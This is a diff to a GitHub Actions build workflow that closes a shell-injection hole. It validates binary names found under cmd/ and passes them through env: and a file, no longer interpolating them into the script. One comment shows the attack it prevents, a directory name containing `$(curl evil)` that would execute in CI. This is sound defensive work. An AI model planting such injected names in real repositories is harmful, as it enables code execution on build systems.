@@ -79,6 +79,18 @@ jobs:
             echo "::error::No binaries discovered under cmd/"
             exit 1
           fi
+          # SEC-07 (audit-2026-07-23): a PR can add cmd/<name>/main.go
+          # with an arbitrary directory name. Reject anything outside
+          # [a-zA-Z0-9-] HERE, before it is ever written to
+          # $GITHUB_OUTPUT and substituted into a later step's shell —
+          # mirrors deploy.yml's binary-name allowlist.
+          while read -r b; do
+            [ -z "$b" ] && continue
+            if ! [[ "$b" =~ ^[a-zA-Z0-9-]+$ ]]; then
+              echo "::error::Binary name '$b' (from cmd/$b/) contains illegal characters; only [a-zA-Z0-9-] permitted"
+              exit 1
+            fi
+          done <<< "$binaries"
           echo "Discovered:"
           echo "$binaries" | sed 's/^/  /'
           {
@@ -92,6 +104,20 @@ jobs:
           CGO_ENABLED: '0'
           GOOS: linux
           GOARCH: amd64
+          # SEC-07 (audit-2026-07-23): route the discovered list through
+          # env: — never `${{ }}` interpolated straight into the shell
+          # (F-1298 pattern, matching deploy.yml). Pre-fix
+          # `done <<< "${{ steps.discover.outputs.binaries }}"` spliced
+          # the raw discovered text into the GENERATED SHELL SCRIPT
+          # before bash ever parsed it: a crafted
+          # cmd/`$(curl evil)`/main.go directory name became literal
+          # shell source, not data — command substitution executed in
+          # this job the moment the step ran, regardless of the
+          # allowlist below (which only runs in a later step). Passing
+          # through env: makes the value plain data: bash parameter
+          # expansion never re-evaluates $()/backticks embedded in a
+          # variable's VALUE.
+          BINARIES: ${{ steps.discover.outputs.binaries }}
         run: |
           set -euo pipefail
           MODULE=$(go list -m)
@@ -100,6 +126,10 @@ jobs:
           VERSION="v0.0.0-pr${{ github.event.pull_request.number || 'manual' }}"
           BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
           mkdir -p dist
+          # Feed the list through a file rather than a `<<<` here-string
+          # built straight from the workflow-templated env var — belt
+          # and braces alongside the env: routing above.
+          printf '%s\n' "$BINARIES" > /tmp/discovered-binaries.list
           while read -r b; do
             [ -z "$b" ] && continue
             echo "== build $b =="
@@ -110,7 +140,7 @@ jobs:
               -o "dist/${b}" \
               "./cmd/${b}"
             ls -la "dist/${b}"
-          done <<< "${{ steps.discover.outputs.binaries }}"
+          done < /tmp/discovered-binaries.list
 
       - name: Smoke-test version reporting
         env:
